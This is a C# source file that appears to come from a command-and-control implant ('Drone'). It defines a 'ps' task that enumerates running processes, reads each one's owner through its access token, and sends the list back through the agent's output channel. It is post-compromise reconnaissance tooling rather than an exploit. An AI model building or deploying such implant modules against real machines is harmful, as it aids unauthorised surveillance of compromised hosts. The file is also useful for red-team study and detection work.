using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;

using Drone.Models;
using Drone.Utilities;

namespace Drone.Functions;

public class ListProcesses : DroneFunction
{
    public override string Name => "ps";
    
    public override void Execute(DroneTask task)
    {
        ResultList<ProcessListResult> results = new();
        var processes = Process.GetProcesses().OrderBy(p => p.Id);

        foreach (var process in processes)
        {
            results.Add(new ProcessListResult
            {
                ProcessId = process.Id,
                ParentProcessId = GetProcessParent(process),
                Name = process.ProcessName,
                Path = GetProcessPath(process),
                SessionId = process.SessionId,
                Owner = GetProcessOwner(process),
                Arch = Environment.Is64BitOperatingSystem ? GetProcessArch(process) : "x86"
            });
        }
        
        Drone.SendOutput(task.TaskId, results.ToString());
    }
    
    private static int GetProcessParent(Process process)
    {
        try
        {
            var pbi = Native.QueryProcessBasicInformation(process.Handle);
            return pbi.InheritedFromUniqueProcessId;
        }
        catch
        {
            return 0;
        }
    }
    
    private static string GetProcessPath(Process process)
    {
        try
        {
            return process.MainModule?.FileName;
        }
        catch
        {
            return "-";
        }
    }
    
    private static string GetProcessOwner(Process process)
    {
        try
        {
            var hToken = Win32.OpenProcessToken(
                process.Handle,
                Win32.TOKEN_ACCESS.TOKEN_ALL_ACCESS);

            if (hToken == IntPtr.Zero)
                return "-";

            using var identity = new WindowsIdentity(hToken);
            Win32.CloseHandle(hToken);
            return identity.Name;
        }
        catch
        {
            return "-";
        }
    }
    
    private static string GetProcessArch(Process process)
    {
        try
        {
            return Native.NtQueryInformationProcessWow64Information(process.Handle) ? "x64" : "x86";
        }
        catch
        {
            return "-";
        }
    }
}

public sealed class ProcessListResult : Result
{
    public int ProcessId { get; set; }
    public int ParentProcessId { get; set; }
    public string Name { get; set; }
    public string Path { get; set; }
    public int SessionId { get; set; }
    public string Owner { get; set; }
    public string Arch { get; set; }

    protected internal override IList<ResultProperty> ResultProperties => new List<ResultProperty>
    {
        new() { Name = "PID", Value = ProcessId },
        new() { Name = "PPID", Value = ParentProcessId },
        new() { Name = "Name", Value = Name },
        new() { Name = "Path", Value = Path },
        new() { Name = "SessionId", Value = SessionId },
        new() { Name = "Owner", Value = Owner },
        new() { Name = "Arch", Value = Arch }
    };
}